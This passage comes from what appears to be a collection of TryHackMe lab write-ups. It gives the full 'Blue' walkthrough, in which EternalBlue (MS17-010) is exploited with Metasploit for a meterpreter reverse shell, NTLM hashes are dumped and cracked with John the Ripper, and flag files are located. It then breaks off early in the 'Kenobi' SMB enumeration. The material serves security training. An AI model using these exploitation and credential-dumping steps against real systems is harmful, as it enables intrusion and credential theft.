root!!!\n"},{"id":2,"href":"/docs/TryHackMe/Blue/","title":"Blue","section":"Try Hack Me","content":" Deploy \u0026amp; hack into a Windows machine, leveraging common misconfigurations issues.\nhttps://tryhackme.com/r/room/blue\nScanning # Scan the machine for open ports and vulnerabilities using nmap.\n❯ rustscan -a 10.10.162.1 -- -sVC .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- 🌍HACK THE PLANET🌍 [~] The config file is expected to be at \u0026#34;/root/.rustscan.toml\u0026#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan\u0026#39;s speed. Use the Docker image, or up the Ulimit with \u0026#39;--ulimit 5000\u0026#39;. Open 10.10.162.1:135 Open 10.10.162.1:139 Open 10.10.162.1:445 Open 10.10.162.1:3389 Open 10.10.162.1:49152 Open 10.10.162.1:49154 Open 10.10.162.1:49153 Open 10.10.162.1:49159 Open 10.10.162.1:49158 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sVC\u0026#34; on ip 10.10.162.1 Depending on the complexity of the script, results may take some time to appear. [~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-24 18:21 EDT NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 18:21 Completed NSE at 18:21, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 18:21 Completed NSE at 18:21, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 18:21 Completed NSE at 18:21, 0.00s elapsed Initiating Ping Scan at 18:21 Scanning 10.10.162.1 [4 ports] Completed Ping Scan at 18:21, 0.15s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 18:21 Completed Parallel DNS resolution of 1 host. at 18:21, 0.04s elapsed DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 18:21 Scanning 10.10.162.1 [9 ports] Discovered open port 135/tcp on 10.10.162.1 Discovered open port 445/tcp on 10.10.162.1 Discovered open port 139/tcp on 10.10.162.1 Discovered open port 3389/tcp on 10.10.162.1 Discovered open port 49159/tcp on 10.10.162.1 Discovered open port 49152/tcp on 10.10.162.1 Discovered open port 49158/tcp on 10.10.162.1 Discovered open port 49153/tcp on 10.10.162.1 Discovered open port 49154/tcp on 10.10.162.1 Completed SYN Stealth Scan at 18:21, 0.16s elapsed (9 total ports) Initiating Service scan at 18:21 Scanning 9 services on 10.10.162.1 Service scan Timing: About 44.44% done; ETC: 18:23 (0:01:09 remaining) Completed Service scan at 18:22, 86.37s elapsed (9 services on 1 host) NSE: Script scanning 10.10.162.1. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 18:22 Completed NSE at 18:22, 5.82s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 18:22 Completed NSE at 18:22, 0.42s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 18:22 Completed NSE at 18:22, 0.00s elapsed Nmap scan report for 10.10.162.1 Host is up, received echo-reply ttl 125 (0.12s latency). Scanned at 2024-05-24 18:21:03 EDT for 92s PORT STATE SERVICE REASON VERSION 135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ms-wbt-server? syn-ack ttl 125 |_ssl-date: 2024-05-24T22:22:35+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=Jon-PC | Issuer: commonName=Jon-PC | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2024-05-23T22:14:32 | Not valid after: 2024-11-22T22:14:32 | MD5: 629ad470ab4e21a9c813d65ab304115f | SHA-1: 993099d4405a6dfab9f6c525bd1ae3e3303c8d9c | -----BEGIN CERTIFICATE----- | MIIC0DCCAbigAwIBAgIQfNA0SBpvGoJLfiNM2PSHGDANBgkqhkiG9w0BAQUFADAR | MQ8wDQYDVQQDEwZKb24tUEMwHhcNMjQwNTIzMjIxNDMyWhcNMjQxMTIyMjIxNDMy | WjARMQ8wDQYDVQQDEwZKb24tUEMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK | AoIBAQDsV5bZ4x4asKFHMR0OI3UTMugwb/0dVzp6WfkpNtFtW0Yjktq1uyqTrbHh | jeTCeLQgYs9CU7MQazj4K6ffIv2Ve0pFKlTKXsgWbGEDzTqUKnOWioP5rrClo5b9 | BX6SIEVgiKzr0EUZss94gezW8RWMVmOcSlMkPwBlvxUmHkfRhOCf9XptEejTMxpV | fDC8hvAOl2YQmBLiNwrYHvDT32xUwzFyC9T6IXSD8no3sg7eaJHbCWBgNU+8rTq5 | h+8tSuJTtTa7w0axS5+T6jRr0P3NjPLGbC0jh7ZG8/+myqZwvIV9g8DB/JjBoOD2 | XAYPCqADeX9t7gWUrYPyu+99srP7AgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF | BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQUFAAOCAQEAIXknfD0u0S0InIoL | EnHxSkF6nkU0xYluo0yIT0J85WAh2XJZhbN51h8wI5zgFbyDhNQITLX0tMwc3p2m | 2nCfM21t5o8VIgJOsM17x4uOqgVpm/egezHoUJEWoexVU4acLf/zZ0eUC6UAXmQk | ouW1jXiG21NWOmwpyAjN7Ixjm9NMGaPok7Y96d4u80wU9etLhDO4h1HLSd3DJEaL | YEpnweXMNg0IuaxJu9V2zykUQUal14bvv0LZNzkZsBD0dFuwJ1ReKVH+39dYUCgU | K8Z2Z2jBo0RcFH0uPBBJ112QTlaC69R2giMQuwERB3rFqmhC7W4k1alP9qfhWSAH | yqNL5g== |_-----END CERTIFICATE----- | rdp-ntlm-info: | Target_Name: JON-PC | NetBIOS_Domain_Name: JON-PC | NetBIOS_Computer_Name: JON-PC | DNS_Domain_Name: Jon-PC | DNS_Computer_Name: Jon-PC | Product_Version: 6.1.7601 |_ System_Time: 2024-05-24T22:22:29+00:00 49152/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49153/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49154/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49158/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49159/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: Jon-PC | NetBIOS computer name: JON-PC\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2024-05-24T17:22:29-05:00 |_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: -1s | nbstat: NetBIOS name: JON-PC, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02291b084223 (unknown) | Names: | JON-PC\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | JON-PC\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1e\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1d\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | \\x01\\x02__MSBROWSE__\\x02\u0026lt;01\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | Statistics: | 02291b0842230000000000000000000000 | 0000000000000000000000000000000000 |_ 0000000000000000000000000000 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 2024-05-24T22:22:29 |_ start_date: 2024-05-24T22:14:25 | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 22780/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 2 (port 41456/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 3 (port 34046/udp): CLEAN (Timeout) | Check 4 (port 27211/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 18:22 Completed NSE at 18:22, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 18:22 Completed NSE at 18:22, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 18:22 Completed NSE at 18:22, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 93.39 seconds Raw packets sent: 13 (548B) | Rcvd: 10 (424B) Running it again to check for vulnerabilities yields the following result.\nHost script results: |_smb-vuln-ms10-054: false |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED From the scan results we can see that the machine is vulnerable to ms17-010.\nExploitation # Let\u0026rsquo;s open metasploit.\nmsfconsole -q Search for the exploit ms17-010 and use exploit/windows/smb/ms17_010_eternalblue.\nsearch ms17-010 use 0 msf6 \u0026gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 2 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 3 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 4 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce msf6 \u0026gt; use 0 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; The payload is set by default to windows/x64/meterpreter/reverse tcp.\nSee the available options and change the rport and lhost.\nshow options set rhosts 10.10.162.1 set lhost tun0 Run the exploit.\nexploit msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; exploit [*] Started reverse TCP handler on 10.6.10.164:4444 [*] 10.10.162.1:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.162.1:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.162.1:445 - Scanned 1 of 1 hosts (100% complete) [+] 10.10.162.1:445 - The target is vulnerable. [*] 10.10.162.1:445 - Connecting to target for exploitation. [+] 10.10.162.1:445 - Connection established for exploitation. [+] 10.10.162.1:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.162.1:445 - CORE raw buffer dump (42 bytes) [*] 10.10.162.1:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.162.1:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.162.1:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.162.1:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.162.1:445 - Trying exploit with 17 Groom Allocations. [*] 10.10.162.1:445 - Sending all but last fragment of exploit packet [*] 10.10.162.1:445 - Starting non-paged pool grooming [+] 10.10.162.1:445 - Sending SMBv2 buffers [+] 10.10.162.1:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.162.1:445 - Sending final SMBv2 buffers. [*] 10.10.162.1:445 - Sending last fragment of exploit packet! [*] 10.10.162.1:445 - Receiving response from exploit packet [+] 10.10.162.1:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.162.1:445 - Sending egg to corrupted connection. [*] 10.10.162.1:445 - Triggering free of corrupted buffer. [*] Sending stage (200774 bytes) to 10.10.162.1 [*] Meterpreter session 1 opened (10.6.10.164:4444 -\u0026gt; 10.10.162.1:49213) at 2024-05-24 18:46:11 -0400 [+] 10.10.162.1:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.162.1:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.162.1:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= meterpreter \u0026gt; We now got a meterpreter shell. Let\u0026rsquo;s quickly find out the information about the machine.\nmeterpreter \u0026gt; getsystem [-] Already running as SYSTEM meterpreter \u0026gt; sysinfo Computer : JON-PC OS : Windows 7 (6.1 Build 7601, Service Pack 1). Architecture : x64 System Language : en_US Domain : WORKGROUP Logged On Users : 0 Meterpreter : x64/windows We are logged in as nt authority\\system. Now we have all privileges to the machine.\nWe can run hashdump in the meterpreter shell to get the hashes.\nmeterpreter \u0026gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: Now we will crack the hash of user Jon with John The Ripper.\njohn hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ❯ cat hash.txt Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: ❯ john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (NT [MD4 128/128 ASIMD 4x2]) Warning: no OpenMP support for this hash type, consider --fork=4 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status alqfna22 (Jon) 1g 0:00:00:00 DONE (2024-05-24 18:52) 1.098g/s 11209Kp/s 11209Kc/s 11209KC/s alshaneebalshaneeb..alphaneons Use the \u0026#34;--show --format=NT\u0026#34; options to display all of the cracked passwords reliably Session completed. root@kali ~/tryhackme ❯ Now let\u0026rsquo;s find the flags. The first flag is located in the location C:\\ .\nmeterpreter \u0026gt; dir C:/ Listing: C:/ ============ Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 040777/rwxrwxrwx 0 dir 2018-12-12 22:13:36 -0500 $Recycle.Bin 040777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 Documents and Settings 040777/rwxrwxrwx 0 dir 2009-07-13 23:20:08 -0400 PerfLogs 040555/r-xr-xr-x 4096 dir 2019-03-17 18:22:01 -0400 Program Files 040555/r-xr-xr-x 4096 dir 2019-03-17 18:28:38 -0400 Program Files (x86) 040777/rwxrwxrwx 4096 dir 2019-03-17 18:35:57 -0400 ProgramData 040777/rwxrwxrwx 0 dir 2018-12-12 22:13:22 -0500 Recovery 040777/rwxrwxrwx 4096 dir 2024-05-24 18:50:58 -0400 System Volume Information 040555/r-xr-xr-x 4096 dir 2018-12-12 22:13:28 -0500 Users 040777/rwxrwxrwx 16384 dir 2019-03-17 18:36:30 -0400 Windows 100666/rw-rw-rw- 24 fil 2019-03-17 15:27:21 -0400 flag1.txt 000000/--------- 0 fif 1969-12-31 19:00:00 -0500 hiberfil.sys 000000/--------- 0 fif 1969-12-31 19:00:00 -0500 pagefile.sys meterpreter \u0026gt; The second flag is located at the location where passwords are stored. The passwords are stored in SAM file. So, the second flag would be in the location C: \\windows\\system32\\config.\nmeterpreter \u0026gt; dir C:/windows\\/system32/config Listing: C:/windows/system32/config =================================== 100666/rw-rw-rw- 12582912 fil 2024-05-24 18:52:09 -0400 SYSTEM 100666/rw-rw-rw- 1024 fil 2011-04-12 04:32:06 -0400 SYSTEM.LOG 100666/rw-rw-rw- 262144 fil 2024-05-24 18:52:09 -0400 SYSTEM.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SYSTEM.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:21:22 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:22 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:22 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 040777/rwxrwxrwx 4096 dir 2018-12-12 18:03:05 -0500 TxR 100666/rw-rw-rw- 34 fil 2019-03-17 15:32:48 -0400 flag2.txt 040777/rwxrwxrwx 4096 dir 2010-11-20 21:41:37 -0500 systemprofile meterpreter \u0026gt; The third flag is located in the Documents folder of the user Jon.\nmeterpreter \u0026gt; dir C:/Users/Jon/Documents Listing: C:/Users/Jon/Documents =============================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 040777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Music 040777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Pictures 040777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Videos 100666/rw-rw-rw- 402 fil 2018-12-12 22:13:48 -0500 desktop.ini 100666/rw-rw-rw- 37 fil 2019-03-17 15:26:36 -0400 flag3.txt meterpreter \u0026gt; "},{"id":3,"href":"/docs/TryHackMe/Kenobi/","title":"Kenobi","section":"Try Hack Me","content":" Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.\nhttps://tryhackme.com/r/room/kenobi\nScanning # First we will deploy the machine and scan the target using rustscan.\n❯ rustscan -a 10.10.112.104 -- -sVC | lolcat .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- 0day was here ♥ [~] The config file is expected to be at \u0026#34;/root/.rustscan.toml\u0026#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan\u0026#39;s speed. Use the Docker image, or up the Ulimit with \u0026#39;--ulimit 5000\u0026#39;. Open 10.10.112.104:21 Open 10.10.112.104:22 Open 10.10.112.104:80 Open 10.10.112.104:111 Open 10.10.112.104:139 Open 10.10.112.104:445 Open 10.10.112.104:2049 Open 10.10.112.104:39105 Open 10.10.112.104:44337 Open 10.10.112.104:51941 Open 10.10.112.104:56481 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sVC\u0026#34; on ip 10.10.112.104 Depending on the complexity of the script, results may take some time to appear. [~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-24 19:45 EDT NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 19:45 Completed NSE at 19:45, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 19:45 Completed NSE at 19:45, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 19:45 Completed NSE at 19:45, 0.00s elapsed Initiating Ping Scan at 19:45 Scanning 10.10.112.104 [4 ports] Completed Ping Scan at 19:45, 0.15s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 19:45 Completed Parallel DNS resolution of 1 host. at 19:45, 0.04s elapsed DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 19:45 Scanning 10.10.112.104 [11 ports] Discovered open port 22/tcp on 10.10.112.104 Discovered open port 139/tcp on 10.10.112.104 Discovered open port 80/tcp on 10.10.112.104 Discovered open port 21/tcp on 10.10.112.104 Discovered open port 56481/tcp on 10.10.112.104 Discovered open port 445/tcp on 10.10.112.104 Discovered open port 39105/tcp on 10.10.112.104 Discovered open port 111/tcp on 10.10.112.104 Discovered open port 44337/tcp on 10.10.112.104 Discovered open port 2049/tcp on 10.10.112.104 Discovered open port 51941/tcp on 10.10.112.104 Completed SYN Stealth Scan at 19:45, 0.27s elapsed (11 total ports) Initiating Service scan at 19:45 Scanning 11 services on 10.10.112.104 Completed Service scan at 19:46, 12.08s elapsed (11 services on 1 host) NSE: Script scanning 10.10.112.104. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 19:46 Completed NSE at 19:46, 3.95s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 19:46 Completed NSE at 19:46, 0.99s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 19:46 Completed NSE at 19:46, 0.00s elapsed Nmap scan report for 10.10.112.104 Host is up, received timestamp-reply ttl 61 (0.12s latency). Scanned at 2024-05-24 19:45:50 EDT for 18s PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 61 ProFTPD 1.3.5 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b3ad834149e95d168d3b0f057be2c0ae (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8m00IxH/X5gfu6Cryqi5Ti2TKUSpqgmhreJsfLL8uBJrGAKQApxZ0lq2rKplqVMs+xwlGTuHNZBVeURqvOe9MmkMUOh4ZIXZJ9KNaBoJb27fXIvsS6sgPxSUuaeoWxutGwHHCDUbtqHuMAoSE2Nwl8G+VPc2DbbtSXcpu5c14HUzktDmsnfJo/5TFiRuYR0uqH8oDl6Zy3JSnbYe/QY+AfTpr1q7BDV85b6xP97/1WUTCw54CKUTV25Yc5h615EwQOMPwox94+48JVmgE00T4ARC3l6YWibqY6a5E8BU+fksse35fFCwJhJEk6xplDkeauKklmVqeMysMWdiAQtDj | 256 f8277d642997e6f865546522f7c81d8a (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBpJvoJrIaQeGsbHE9vuz4iUyrUahyfHhN7wq9z3uce9F+Cdeme1O+vIfBkmjQJKWZ3vmezLSebtW3VRxKKH3n8= | 256 5a06edebb6567e4c01ddeabcbafa3379 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB22m99Wlybun7o/h9e6Ea/9kHMT0Dz2GqSodFqIWDi 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/admin.html | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) 111/tcp open rpcbind syn-ack ttl 61 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100003 2,3,4 2049/udp nfs | 100003 2,3,4 2049/udp6 nfs | 100005 1,2,3 36941/udp mountd | 100005 1,2,3 44306/udp6 mountd | 100005 1,2,3 50675/tcp6 mountd | 100005 1,2,3 56481/tcp mountd | 100021 1,3,4 41673/tcp6 nlockmgr | 100021 1,3,4 44337/tcp nlockmgr | 100021 1,3,4 45479/udp6 nlockmgr | 100021 1,3,4 59376/udp nlockmgr | 100227 2,3 2049/tcp nfs_acl | 100227 2,3 2049/tcp6 nfs_acl | 100227 2,3 2049/udp nfs_acl |_ 100227 2,3 2049/udp6 nfs_acl 139/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 2049/tcp open nfs_acl syn-ack ttl 61 2-3 (RPC #100227) 39105/tcp open mountd syn-ack ttl 61 1-3 (RPC #100005) 44337/tcp open nlockmgr syn-ack ttl 61 1-4 (RPC #100021) 51941/tcp open mountd syn-ack ttl 61 1-3 (RPC #100005) 56481/tcp open mountd syn-ack ttl 61 1-3 (RPC #100005) Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 56068/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 2 (port 32401/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 3 (port 8514/udp): CLEAN (Failed to receive data) | Check 4 (port 35266/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked |_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s | nbstat: NetBIOS name: KENOBI, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 000000000000 (Xerox) | Names: | KENOBI\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | KENOBI\u0026lt;03\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | KENOBI\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | \\x01\\x02__MSBROWSE__\\x02\u0026lt;01\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1d\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1e\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | Statistics: | 0000000000000000000000000000000000 | 0000000000000000000000000000000000 |_ 0000000000000000000000000000 | smb2-time: | date: 2024-05-24T23:46:04 |_ start_date: N/A | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: kenobi | NetBIOS computer name: KENOBI\\x00 | Domain name: \\x00 | FQDN: kenobi |_ System time: 2024-05-24T18:46:04-05:00 | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 19:46 Completed NSE at 19:46, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 19:46 Completed NSE at 19:46, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 19:46 Completed NSE at 19:46, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.86 seconds Raw packets sent: 15 (636B) | Rcvd: 12 (524B) Enumeration # We can see that there is Samba file server running, so let\u0026rsquo;s find the available shares.\n❯ smbclient -L 10.10.112.104 Password for [WORKGROUP\\root]: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers anonymous Disk IPC$ IPC IPC Service (kenobi server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP KENOBI root@kali ~/tryhackme 6s ❯ We will now try to connect to the anonymous share.\n❯ smbclient \\\\\\\\10.10.112.104\\\\anonymous Password for [WORKGROUP\\root]: Try \u0026#34;help\u0026#34; to get a list of 